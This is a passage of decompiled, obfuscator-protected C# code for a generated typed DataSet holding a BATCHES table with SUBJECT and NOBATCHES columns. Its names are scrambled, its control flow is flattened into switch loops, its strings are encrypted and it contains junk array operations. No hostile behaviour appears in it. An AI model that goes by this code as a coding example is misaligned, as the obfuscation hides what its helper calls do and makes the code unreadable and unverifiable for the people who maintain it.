        this.columnNOBATCHES = j6D2.t2JS<DataTable>((DataTable) this, '̝', '̄')[p3P.Ay5((p3P) null, 5, 850351384)];
      }

      [GeneratedCode("System.Data.Design.TypedDataSetGenerator", "16.0.0.0")]
      private void Ha78()
      {
        int num = 1;
        while (true)
        {
          switch (num)
          {
            case 0:
              this.columnNOBATCHES = new DataColumn(p3P.Ay5((p3P) null, 3, 850351390), typeof (Decimal), (string) null, MappingType.Element);
              num = 4;
              continue;
            case 2:
            case 5:
              Qx0y.Td0y<DataColumnCollection, DataColumn>(j6D2.t2JS<DataTable>((DataTable) this, 'x', 'a'), this.columnSUBJECT, (short) 443, 470);
              num = 0;
              continue;
            case 3:
              this.columnNOBATCHES.ReadOnly = true;
              num = 7;
              continue;
            case 4:
              j6D2.t2JS<DataTable>((DataTable) this, 'Ƽ', 'ƥ').Add(this.columnNOBATCHES);
              goto case 3;
            case 6:
              goto label_7;
            case 7:
              goto label_8;
            default:
              this.columnSUBJECT = new DataColumn(p3P.Ay5((p3P) null, 0, 850350167), typeof (string), (string) null, MappingType.Element);
              num = 2;
              continue;
          }
        }
label_7:
        return;
label_8:;
      }

      [GeneratedCode("System.Data.Design.TypedDataSetGenerator", "16.0.0.0")]
      public b0M4.Fg3o q4ZQ() => (b0M4.Fg3o) Yc9.Yd5<DataTable>((DataTable) this, '\u000E', 16);

      [GeneratedCode("System.Data.Design.TypedDataSetGenerator", "16.0.0.0")]
      protected virtual DataRow d7C3(DataRowBuilder Lc60) => (DataRow) new b0M4.Fg3o(Lc60);

      [GeneratedCode("System.Data.Design.TypedDataSetGenerator", "16.0.0.0")]
      protected virtual Type Tf07() => typeof (b0M4.Fg3o);

      [GeneratedCode("System.Data.Design.TypedDataSetGenerator", "16.0.0.0")]
      protected virtual void w3BY(DataRowChangeEventArgs i4M5)
      {
        int[] y = f7Y9.Y;
        int num = 5;
        bool flag;
        b0M4.y3N1 batchesRowChangedEvent;
        while (true)
        {
          switch (num)
          {
            case 0:
              num = !flag ? 6 : 7;
              continue;
            case 1:
              num = y[51] - 50634;
              continue;
            case 2:
              num = 1;
              continue;
            case 3:
            case 8:
              flag = this.BATCHESRowChangedEvent != null;
              num = 0;
              continue;
            case 4:
              batchesRowChangedEvent((object) this, new b0M4.e8RK((b0M4.Fg3o) Qx0y.j7AD<DataRowChangeEventArgs>(i4M5, '\u038B', 941), y4T2.g4XE<DataRowChangeEventArgs>(i4M5, (short) 632, 'Ȝ')));
              goto case 2;
            case 6:
              goto label_9;
            case 7:
              batchesRowChangedEvent = this.BATCHESRowChangedEvent;
              num = batchesRowChangedEvent == null ? 1 : 4;
              continue;
            default:
              this.OnRowChanged(i4M5);
              goto case 3;
          }
        }
label_9:;
      }

      [GeneratedCode("System.Data.Design.TypedDataSetGenerator", "16.0.0.0")]
      protected virtual void Xs36(DataRowChangeEventArgs f4S7)
      {
        int num1 = 2;
        bool flag;
        b0M4.y3N1 rowChangingEvent;
        while (true)
        {
          switch (num1)
          {
            case 0:
              goto label_8;
            case 3:
              int num2 = flag ? 1 : 0;
              Sb1p.V[1] = (char) ((int) Sb1p.V[1] & (int) Sb1p.V[250] & 209);
              num1 = num2 == 0 ? 0 : 5;
              continue;
            case 4:
            case 5:
              rowChangingEvent = this.BATCHESRowChangingEvent;
              goto case 8;
            case 6:
              rowChangingEvent((object) this, new b0M4.e8RK((b0M4.Fg3o) Qx0y.j7AD<DataRowChangeEventArgs>(f4S7, '϶', 976), y4T2.g4XE<DataRowChangeEventArgs>(f4S7, (short) 816, '͔')));
              num1 = 7;
              continue;
            case 7:
              num1 = 0;
              continue;
            case 8:
              num1 = rowChangingEvent == null ? 7 : 6;
              continue;
            default:
              this.OnRowChanging(f4S7);
              flag = this.BATCHESRowChangingEvent != null;
              num1 = 3;
              continue;
          }
        }
label_8:;
      }

      [GeneratedCode("System.Data.Design.TypedDataSetGenerator", "16.0.0.0")]
      protected virtual void t4T2(DataRowChangeEventArgs Mj3w)
      {
        int num = 8;
        bool flag;
        b0M4.y3N1 batchesRowDeletedEvent;
        while (true)
        {
          switch (num)
          {
            case 0:
              batchesRowDeletedEvent((object) this, new b0M4.e8RK((b0M4.Fg3o) Qx0y.j7AD<DataRowChangeEventArgs>(Mj3w, 'ő', 375), y4T2.g4XE<DataRowChangeEventArgs>(Mj3w, (short) 601, 'Ƚ')));
              num = 1;
              continue;
            case 1:
            case 7:
              num = 3;
              continue;
            case 2:
            case 4:
              batchesRowDeletedEvent = this.BATCHESRowDeletedEvent;
              goto case 5;
            case 3:
              goto label_8;
            case 5:
              num = batchesRowDeletedEvent == null ? 1 : 0;
              continue;
            case 6:
              num = !flag ? 3 : 2;
              continue;
            default:
              this.OnRowDeleted(Mj3w);
              flag = this.BATCHESRowDeletedEvent != null;
              num = 6;
              continue;
          }
        }
label_8:;
      }

      [GeneratedCode("System.Data.Design.TypedDataSetGenerator", "16.0.0.0")]
      protected virtual void Fx5b(DataRowChangeEventArgs y0FL)
      {
        int num = 8;
        bool flag;
        b0M4.y3N1 rowDeletingEvent;
        while (true)
        {
          switch (num)
          {
            case 0:
            case 4:
              rowDeletingEvent = this.BATCHESRowDeletingEvent;
              num = rowDeletingEvent == null ? 3 : 5;
              continue;
            case 1:
              num = !flag ? 2 : 4;
              continue;
            case 2:
              goto label_8;
            case 3:
              num = 2;
              continue;
            case 5:
              rowDeletingEvent((object) this, new b0M4.e8RK((b0M4.Fg3o) Qx0y.j7AD<DataRowChangeEventArgs>(y0FL, 'ʡ', 647), y4T2.g4XE<DataRowChangeEventArgs>(y0FL, (short) 358, 'Ă')));
              num = 3;
              continue;
            case 6:
              goto label_9;
            case 7:
              flag = this.BATCHESRowDeletingEvent != null;
              num = 1;
              continue;
            default:
              this.OnRowDeleting(y0FL);
              goto case 7;
          }
        }
label_8:
        return;
label_9:;
      }

      [GeneratedCode("System.Data.Design.TypedDataSetGenerator", "16.0.0.0")]
      public void r1C6(b0M4.Fg3o Ts03) => n8F.p0P<DataTable>((DataTable) this, 'ș', (short) 582).Remove((DataRow) Ts03);

      [GeneratedCode("System.Data.Design.TypedDataSetGenerator", "16.0.0.0")]
      public static XmlSchemaComplexType w9QC(XmlSchemaSet f9E3)
      {
        int num1 = 14;
        XmlSchemaComplexType schemaComplexType1;
        XmlSchemaSequence xmlSchemaSequence;
        b0M4 b0M4;
        XmlSchemaAny xmlSchemaAny1;
        XmlSchemaAny xmlSchemaAny2;
        XmlSchemaAttribute xmlSchemaAttribute1;
        XmlSchemaAttribute xmlSchemaAttribute2;
        XmlSchema schema;
        bool flag1;
        while (true)
        {
          switch (num1)
          {
            case 0:
              e3F.d5P<string, XmlSchemaAttribute>(xmlSchemaAttribute2, Cm9.Qj5(8, (byte) 0, 574087990), 'ǆ', 397);
              num1 = 17;
              continue;
            case 1:
              j6D2.o1S3<XmlSchemaAny>(xmlSchemaAny1, XmlSchemaContentProcessing.Lax, 143, 'ñ');
              Cm9.Yp6<XmlSchemaObjectCollection, XmlSchemaObject>(Yc9.y8F<XmlSchemaSequence>(xmlSchemaSequence, 438, (short) 436), (XmlSchemaObject) xmlSchemaAny1, 'P', 111);
              num1 = 6;
              continue;
            case 2:
              Cm9.Yp6<XmlSchemaObjectCollection, XmlSchemaObject>(f5B.Gb6<XmlSchemaComplexType>(schemaComplexType1, 617, 568), (XmlSchemaObject) xmlSchemaAttribute1, '\t', 54);
              num1 = 10;
              continue;
            case 3:
              flag1 = f5B.Ta3<string, XmlSchemaSet>(f9E3, Yc9.Mf3<XmlSchema>(schema, 'Ţ', 'ħ'), 'ũ', 352);
              num1 = 16;
              continue;
            case 4:
              num1 = 18;
              continue;
            case 5:
              goto label_19;
            case 6:
              xmlSchemaAny2 = new XmlSchemaAny();
              Yc9.Lf4<XmlSchemaAny, string>(xmlSchemaAny2, Cm9.Qj5(8, (byte) 6, 574088026), (short) 477, 384);
              num1 = 12;
              continue;
            case 7:
              Cm9.Yp6<XmlSchemaObjectCollection, XmlSchemaObject>(Yc9.y8F<XmlSchemaSequence>(xmlSchemaSequence, 359, (short) 357), (XmlSchemaObject) xmlSchemaAny2, 'Ä', 251);
              num1 = 13;
              continue;
            case 8:
              e3F.d5P<string, XmlSchemaAttribute>(xmlSchemaAttribute1, j6D2.g3NC<DataSet>((DataSet) b0M4, 575, (short) 533), 'ϰ', 955);
              num1 = 2;
              continue;
            case 9:
            case 18:
              j6D2.Mx16<XmlSchemaParticle>((XmlSchemaParticle) xmlSchemaAny1, 0M, (short) 580, 623);
              j6D2.Mx16<XmlSchemaParticle>((XmlSchemaParticle) xmlSchemaAny1, Decimal.MaxValue, (short) 955, 919);
              num1 = 1;
              continue;
            case 10:
              xmlSchemaAttribute2 = new XmlSchemaAttribute();
              e3F.d5P<string, XmlSchemaAttribute>(xmlSchemaAttribute2, p3P.Ay5((p3P) null, 2, 850350577), '̶', 892);
              num1 = 0;
              continue;
            case 11:
            case 12:
              j6D2.Mx16<XmlSchemaParticle>((XmlSchemaParticle) xmlSchemaAny2, 1M, (short) 754, 729);
              j6D2.o1S3<XmlSchemaAny>(xmlSchemaAny2, XmlSchemaContentProcessing.Lax, 521, 'ɷ');
              num1 = 7;
              continue;
            case 13:
              xmlSchemaAttribute1 = new XmlSchemaAttribute();
              e3F.d5P<string, XmlSchemaAttribute>(xmlSchemaAttribute1, p3P.Ay5((p3P) null, 7, 850350568), 'Ċ', 320);
              num1 = 8;
              continue;
            case 15:
              Pa8.a8L<XmlSchemaComplexType, XmlSchemaParticle>(schemaComplexType1, (XmlSchemaParticle) xmlSchemaSequence, (short) 700, 'ˡ');
              schema = b0M4.Di10();
              num1 = 3;
              continue;
            case 16:
              if (flag1)
              {
                num1 = 5;
                continue;
              }
              goto label_50;
            case 17:
              Cm9.Yp6<XmlSchemaObjectCollection, XmlSchemaObject>(f5B.Gb6<XmlSchemaComplexType>(schemaComplexType1, 503, 422), (XmlSchemaObject) xmlSchemaAttribute2, '͵', 842);
              num1 = 15;
              continue;
            default:
              schemaComplexType1 = new XmlSchemaComplexType();
              xmlSchemaSequence = new XmlSchemaSequence();
              b0M4 = new b0M4();
              xmlSchemaAny1 = new XmlSchemaAny();
              Yc9.Lf4<XmlSchemaAny, string>(xmlSchemaAny1, p3P.Ay5((p3P) null, 3, 850350529), (short) 1003, 950);
              goto case 4;
          }
        }
label_19:
        MemoryStream memoryStream1 = new MemoryStream();
        MemoryStream memoryStream2 = new MemoryStream();
        XmlSchemaComplexType schemaComplexType2;
        try
        {
          int num2 = 1;
          while (true)
          {
            XmlSchema xmlSchema;
            IEnumerator enumerator;
            bool flag2;
            int num3;
            switch (num2)
            {
              case 0:
                num2 = 7;
                continue;
              case 2:
                num2 = 0;
                continue;
              case 3:
                num2 = memoryStream1.Position == memoryStream1.Length ? 17 : 6;
                continue;
              case 4:
                num2 = 3;
                continue;
              case 5:
                goto label_35;
              case 6:
                num3 = memoryStream1.ReadByte() == memoryStream2.ReadByte() ? 1 : 0;
                break;
              case 7:
                num2 = enumerator.MoveNext() ? 8 : 15;
                continue;
              case 8:
                xmlSchema = (XmlSchema) enumerator.Current;
                goto case 14;
              case 9:
                enumerator = y4T2.Sm24<XmlSchemaSet, string>(f9E3, Yc9.Mf3<XmlSchema>(schema, '(', 'm'), 'ǁ', 'ǧ').GetEnumerator();
                num2 = 7;
                continue;
              case 10:
              case 18:
                num2 = memoryStream1.Position != memoryStream1.Length ? 2 : 5;
                continue;
              case 12:
                num2 = !flag2 ? 0 : 19;
                continue;
              case 13:
              case 17:
                num3 = 0;
                break;
              case 14:
                y4T2.m3A0<MemoryStream>(memoryStream2, 0L, '˗', (short) 727);
                num2 = 16;
                continue;
              case 15:
                goto label_47;
              case 16:
                n8F.Yy6<XmlSchema, Stream>(xmlSchema, (Stream) memoryStream2, 'ʰ', (short) 677);
                flag2 = Cm9.Yp1<MemoryStream>(memoryStream1, (short) 509, 'ǰ') == Cm9.Yp1<MemoryStream>(memoryStream2, (short) 58, '7');
                num2 = 12;
                continue;
              case 19:
                memoryStream1.Position = 0L;
                memoryStream2.Position = 0L;
                num2 = 3;
                continue;
              default:
                xmlSchema = (XmlSchema) null;
                n8F.Yy6<XmlSchema, Stream>(schema, (Stream) memoryStream1, 'ʴ', (short) 673);
                num2 = 9;
                continue;
            }
            num2 = num3 != 0 ? 4 : 10;
          }
label_35:
          schemaComplexType2 = schemaComplexType1;
          goto label_51;
        }
        finally
        {
          int num4 = 7;
          while (true)
          {
            switch (num4)
            {
              case 0:
                memoryStream2.Close();
                num4 = 4;
                continue;
              case 1:
              case 4:
                goto label_46;
              case 3:
                memoryStream1.Close();
                goto case 6;
              case 6:
                num4 = 8;
                continue;
              case 8:
                num4 = memoryStream2 == null ? 4 : 0;
                continue;
              default:
                num4 = memoryStream1 == null ? 8 : 3;
                continue;
            }
          }
label_46:;
        }
label_47:
        int num5 = 3;
label_48:
        while (true)
        {
          switch (num5)
          {
            case 0:
            case 1:
              goto label_50;
            case 6:
              goto label_51;
            default:
              num5 = 1;
              continue;
          }
        }
label_50:
        f9E3.Add(schema);
        schemaComplexType2 = schemaComplexType1;
        num5 = 6;
        goto label_48;
label_51:
        return schemaComplexType2;
      }
    }

    public class Fg3o : DataRow
    {
      private b0M4.d0L4 tableBATCHES;

      [GeneratedCode("System.Data.Design.TypedDataSetGenerator", "16.0.0.0")]
      internal Fg3o(DataRowBuilder rb)
        : base(rb)
      {
        this.tableBATCHES = (b0M4.d0L4) Qx0y.n9B3<DataRow>((DataRow) this, '\u00BC', 187);
      }

      [GeneratedCode("System.Data.Design.TypedDataSetGenerator", "16.0.0.0")]
      public string SUBJECT
      {
        get
        {
          try
          {
            return e3F.Td3<object>(Pa8.Jo4<DataRow, DataColumn>((DataRow) this, this.tableBATCHES.SUBJECTColumn, 282, 305), (short) 898, 'Ͻ');
          }
          catch (InvalidCastException ex)
          {
            e3F.p7Q<Exception>((Exception) ex, 235, 'Ü');
            InvalidCastException innerException = ex;
            throw new StrongTypingException(p3P.Ay5((p3P) null, 4, 850351325), (Exception) innerException);
          }
        }
        set
        {
          int num = 4;
          while (true)
          {
            switch (num)
            {
              case 0:
                goto label_3;
              case 1:
                goto label_4;
              case 2:
                goto label_5;
              case 3:
                goto label_6;
              default:
                y4T2.n9AJ<DataRow, object, DataColumn>((DataRow) this, this.tableBATCHES.SUBJECTColumn, (object) value, 'Ċ', 'Ž');
                num = 2;
                continue;
            }
          }
label_3:
          return;
label_4:
          return;
label_5:
          return;
label_6:;
        }
      }

      [GeneratedCode("System.Data.Design.TypedDataSetGenerator", "16.0.0.0")]
      public Decimal NOBATCHES
      {
        get
        {
          Decimal num1;
          try
          {
            num1 = Cm9.Bw2<object>(Pa8.Jo4<DataRow, DataColumn>((DataRow) this, this.tableBATCHES.NOBATCHESColumn, 152, 179), 637, 'Ț');
          }
          catch (InvalidCastException ex)
          {
            e3F.p7Q<Exception>((Exception) ex, 295, 'Đ');
            InvalidCastException innerException = ex;
            throw new StrongTypingException(p3P.Ay5((p3P) null, 5, 850352966), (Exception) innerException);
          }
          Decimal num2 = num1;
          f7Y9.Y[485] = (f7Y9.Y[485] | f7Y9.Y[415]) & 18;
          return num2;
        }
        set
        {
          int num = 3;
          while (true)
          {
            switch (num)
            {
              case 1:
                goto label_3;
              case 2:
                goto label_4;
              default:
                y4T2.n9AJ<DataRow, object, DataColumn>((DataRow) this, this.tableBATCHES.NOBATCHESColumn, (object) value, '\n', '}');
                num = 1;
                continue;
            }
          }
label_3:
          return;
label_4:;
        }
      }

      [GeneratedCode("System.Data.Design.TypedDataSetGenerator", "16.0.0.0")]
      public bool Xi25()
      {
        int num = 3;
        bool flag;
        while (true)
        {
          switch (num)
          {
            case 2:
              goto label_3;
            default:
              flag = c8T.i4L<DataRow, DataColumn>((DataRow) this, this.tableBATCHES.SUBJECTColumn, 53, (short) 43);
              num = 2;
              continue;
          }
        }
label_3:
        return flag;
      }

      [GeneratedCode("System.Data.Design.TypedDataSetGenerator", "16.0.0.0")]
      public void n9N1()
      {
        int num = 2;
        while (true)
        {
          switch (num)
          {
            case 0:
              goto label_4;
            case 1:
            case 3:
              num = 4;
              continue;
            case 4:
              goto label_5;
            default:
              this[this.tableBATCHES.SUBJECTColumn] = w0DB.y3G0<object>(Convert.DBNull, (short) 599, 515);
              goto case 1;
          }
        }
label_4:
        return;
label_5:;
      }

      [GeneratedCode("System.Data.Design.TypedDataSetGenerator", "16.0.0.0")]
      public bool Rx76()
      {
        int num = 4;
        bool flag;
        while (true)
        {
          switch (num)
          {
            case 0:
              num = 1;
              continue;
            case 1:
              goto label_4;
            default:
              flag = c8T.i4L<DataRow, DataColumn>((DataRow) this, this.tableBATCHES.NOBATCHESColumn, 74, (short) 84);
              goto case 0;
          }
        }
label_4:
        return flag;
      }

      [GeneratedCode("System.Data.Design.TypedDataSetGenerator", "16.0.0.0")]
      public void Wi48()
      {
        int num = 4;
        while (true)
        {
          switch (num)
          {
            case 0:
              num = 2;
              continue;
            case 1:
              goto label_4;
            case 2:
              goto label_5;
            default:
              this[this.tableBATCHES.NOBATCHESColumn] = w0DB.y3G0<object>(Convert.DBNull, (short) 225, 181);
              goto case 0;
          }
        }
label_4:
        return;
label_5:;
      }
    }

    [GeneratedCode("System.Data.Design.TypedDataSetGenerator", "16.0.0.0")]
    public class e8RK : EventArgs
    {
      private b0M4.Fg3o eventRow;
      private DataRowAction eventAction;

      [GeneratedCode("System.Data.Design.TypedDataSetGenerator", "16.0.0.0")]
      public e8RK(b0M4.Fg3o row, DataRowAction action)
      {
        this.eventRow = row;
        this.eventAction = action;
      }

      [GeneratedCode("System.Data.Design.TypedDataSetGenerator", "16.0.0.0")]
      public b0M4.Fg3o Row => this.eventRow;

      [GeneratedCode("System.Data.Design.TypedDataSetGenerator", "16.0.0.0")]
      public DataRowAction Action => this.eventAction;
    }
  }
}
